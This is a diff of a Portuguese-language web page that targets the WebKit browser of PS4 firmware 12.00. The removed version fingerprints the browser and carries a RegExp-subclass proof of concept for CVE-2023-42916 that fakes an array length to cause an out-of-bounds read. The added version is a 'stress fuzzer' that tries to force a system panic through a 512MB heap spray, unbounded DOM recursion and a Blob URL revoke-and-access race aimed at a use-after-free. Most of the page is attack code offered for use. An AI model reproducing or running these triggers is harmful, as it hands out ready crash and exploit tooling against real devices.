@@ -2,111 +2,122 @@
 <html lang="pt-br">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PS4 FW 12.00 WebKit PoC</title>
+    <title>PS4 FW 12.00 - Binary Stress Test</title>
     <style>
-        body { background-color: #1a1a1a; color: #00ff00; font-family: 'Courier New', monospace; padding: 20px; }
-        h1 { border-bottom: 2px solid #00ff00; }
-        .box { border: 1px solid #444; padding: 10px; margin-bottom: 10px; background: #222; }
-        button { background: #cc0000; color: white; padding: 15px; font-size: 16px; border: none; cursor: pointer; font-weight: bold; }
-        button:hover { background: #ff0000; }
-        #log { white-space: pre-wrap; word-wrap: break-word; }
+        body { background-color: #000; color: #0f0; font-family: monospace; font-size: 14px; padding: 20px; }
+        button { width: 100%; padding: 20px; margin: 10px 0; background: #333; color: #fff; border: 1px solid #0f0; font-size: 18px; cursor: pointer; }
+        button:hover { background: #555; }
+        .log { border: 1px solid #444; height: 200px; overflow-y: scroll; padding: 10px; color: #aaa; margin-top: 10px; }
     </style>
 </head>
 <body>
+    <h1>PS4 12.00 WebKit Stress Fuzzer</h1>
+    <p>Objetivo: Forçar Panic via Heap Spray ou Stack Overflow.</p>
 
-    <h1>PS4 12.00 - WebKit Investigator</h1>
-    
-    <div class="box">
-        <h3>1. Diagnóstico de Versão (Baseado na análise ELF)</h3>
-        <div id="info">Carregando...</div>
-    </div>
+    <button onclick="startHeapSpray()">1. TESTE: Heap Spray (ArrayBuffer Storm)</button>
+    <button onclick="startDOMRecursion()">2. TESTE: DOM Recursion (Stack Overflow)</button>
+    <button onclick="startBlobStorm()">3. TESTE: Blob/URL Allocation (Use-After-Free check)</button>
 
-    <div class="box">
-        <h3>2. Verificação de WebGPU</h3>
-        <div id="gpuStatus">Verificando suporte a WebGPU...</div>
-    </div>
-
-    <div class="box">
-        <h3>3. Teste de Vulnerabilidade (CVE-2023-42916)</h3>
-        <p>Tenta disparar um "Out-of-Bounds Read" manipulando o RegExp. Se o navegador fechar, é VULNERÁVEL.</p>
-        <button onclick="runCrashTest()">EXECUTAR CRASH TEST</button>
-    </div>
-
-    <div class="box">
-        <h3>Log de Execução:</h3>
-        <div id="log"></div>
-    </div>
+    <div class="log" id="console">Log do Sistema aguardando...</div>
 
     <script>
         function log(msg) {
-            document.getElementById('log').innerHTML += msg + "\n";
+            const c = document.getElementById('console');
+            c.innerText = `[${new Date().toLocaleTimeString()}] ${msg}\n` + c.innerText;
         }
 
-        // 1. Diagnóstico de Versão
-        const ua = navigator.userAgent;
-        let analysis = "User Agent: " + ua + "\n\n";
-        
-        // Verifica se bate com o Safari 17.0 encontrado no ELF
-        if (ua.includes("Version/17.0")) {
-            analysis += "[!] ALVO IDENTIFICADO: Base Safari 17.0 detectada.\n";
-            analysis += "[!] Potencialmente vulnerável a CVEs de late-2023.\n";
-        } else {
-            analysis += "[-] Versão diferente da esperada (Check manual necessário).\n";
-        }
-        document.getElementById('info').innerText = analysis;
-
-        // 2. Diagnóstico WebGPU (Detectamos strings no libSceNKWebKit.sprx.elf)
-        if (navigator.gpu) {
-            document.getElementById('gpuStatus').innerHTML = "<b style='color:red'>[CRÍTICO] WebGPU está ATIVO!</b><br>Isso abre uma enorme superfície de ataque (Shaders, Memory Corruption).";
-        } else {
-            document.getElementById('gpuStatus').innerHTML = "<span style='color:yellow'>[-] WebGPU presente no binário, mas desativado por padrão no DOM.</span>";
-        }
-
-        // 3. PoC para CVE-2023-42916 (Conceitual - OOB Read via RegExp)
-        // A lógica abaixo tenta confundir o otimizador do WebKit sobre o tamanho do objeto
-        function runCrashTest() {
-            log("[*] Iniciando alocação de heap...");
-            
+        // --- VETOR 1: Heap Spray baseado em bmalloc ---
+        // Tenta esgotar a memória física disponível para o processo WebKit
+        // forçando o Garbage Collector a entrar em falha crítica.
+        var sprayStore = [];
+        function startHeapSpray() {
+            log("Iniciando Heap Spray de 512MB...");
             try {
-                const arr = [];
-                for (let i = 0; i < 10000; i++) arr.push(i);
-
-                log("[*] Preparando RegExp malicioso...");
+                // O WebKit do PS4 geralmente crasha com alocações repetidas de ~32MB
+                const targetSize = 1024 * 1024 * 32; 
+                const sprayCount = 16; 
                 
-                // O bug CVE-2023-42916 envolve manipulação de subclassing de RegExp
-                // para ler fora dos limites durante a substituição.
-                class MaliciousRegExp extends RegExp {
-                    exec(str) {
-                        const result = super.exec(str);
-                        if (result) {
-                            // Retornamos um array falso com tamanho mentiroso
-                            // Isso tenta fazer o motor ler memória que não pertence a ele
-                            result.length = 0x100000; 
-                            return result;
-                        }
-                        return null;
+                let i = 0;
+                let interval = setInterval(() => {
+                    if (i >= sprayCount) {
+                        clearInterval(interval);
+                        log("Spray concluído. Se não crashou, tente o teste 2.");
+                        // Não limpamos o array para manter a pressão na memória
+                        return;
                     }
-                }
-
-                const regex = new MaliciousRegExp('a');
-                regex.exec = function() {
-                    // Força o retorno de um objeto que engana o engine
-                    return { 0: 'a', length: 0xFFFFFF, index: 0, input: 'aaa' };
-                };
-
-                log("[*] DISPARANDO GATILHO...");
-                
-                // A função replace em versões vulneráveis confia no 'length' retornado
-                // e tenta ler memória fora do buffer da string.
-                "".replace(regex, "b");
-                
-                log("[-] O navegador sobreviveu. Pode não estar vulnerável ou o ASLR protegeu.");
-
+                    
+                    // Aloca ArrayBuffer preenchido (cria pressão real na RAM)
+                    let buffer = new ArrayBuffer(targetSize);
+                    let view = new Uint32Array(buffer);
+                    for(let k=0; k < view.length; k+=1024) view[k] = 0x41414141; // Escreve 'AAAA'
+                    
+                    sprayStore.push(buffer);
+                    log(`Chunk ${i+1}/${sprayCount} alocado (${targetSize/1024/1024}MB)`);
+                    i++;
+                }, 200);
             } catch (e) {
-                log("[!] Exceção capturada: " + e);
-                log("[?] Se não crashou, tente recarregar a página algumas vezes.");
+                log("ERRO CRÍTICO (Isso é bom!): " + e);
             }
+        }
+
+        // --- VETOR 2: Stack Exhaustion ---
+        // O binário libSceNKWebKit tem limites de pilha definidos.
+        // Criar elementos HTML aninhados infinitamente estoura esse limite.
+        function startDOMRecursion() {
+            log("Iniciando ataque de Profundidade DOM...");
+            setTimeout(() => {
+                try {
+                    let root = document.createElement('div');
+                    document.body.appendChild(root);
+                    let count = 0;
+                    
+                    function dive() {
+                        count++;
+                        let child = document.createElement('div');
+                        // Adiciona texto para forçar renderização e layout calculation (mais pesado)
+                        child.innerText = "."; 
+                        root.appendChild(child);
+                        root = child; // Desce um nível
+                        
+                        if (count % 100 === 0) log(`Profundidade: ${count}`);
+                        dive(); // Recursão
+                    }
+                    dive();
+                } catch (e) {
+                    log("Crash evitado pelo navegador: " + e);
+                    log("O navegador limitou a recursão. Tentando método alternativo...");
+                    document.body.innerHTML = "<div>".repeat(20000) + "</div>".repeat(20000);
+                }
+            }, 500);
+        }
+
+        // --- VETOR 3: ObjectURL Storm ---
+        // Cria e revoga URLs rapidamente para tentar causar Race Condition ou UAF
+        // no gerenciamento de recursos do WebKit.
+        function startBlobStorm() {
+            log("Iniciando Tempestade de BLOBs...");
+            const total = 5000;
+            let blobs = [];
+            
+            // 1. Criação em massa
+            for(let i=0; i < total; i++) {
+                let b = new Blob(["A".repeat(1024)], {type: 'application/octet-stream'});
+                blobs.push(URL.createObjectURL(b));
+            }
+            log(`${total} Blobs criados.`);
+
+            // 2. Revogação e Acesso simultâneo (Tentativa de UAF)
+            setTimeout(() => {
+                log("Revogando e acessando simultaneamente...");
+                for(let i=0; i < total; i++) {
+                    URL.revokeObjectURL(blobs[i]);
+                    // Tenta acessar logo após revogar (pode causar panic se o garbage collector for lento)
+                    let xhr = new XMLHttpRequest();
+                    xhr.open('GET', blobs[i], true);
+                    xhr.send();
+                }
+                log("Ciclo finalizado.");
+            }, 1000);
         }
     </script>
 </body>
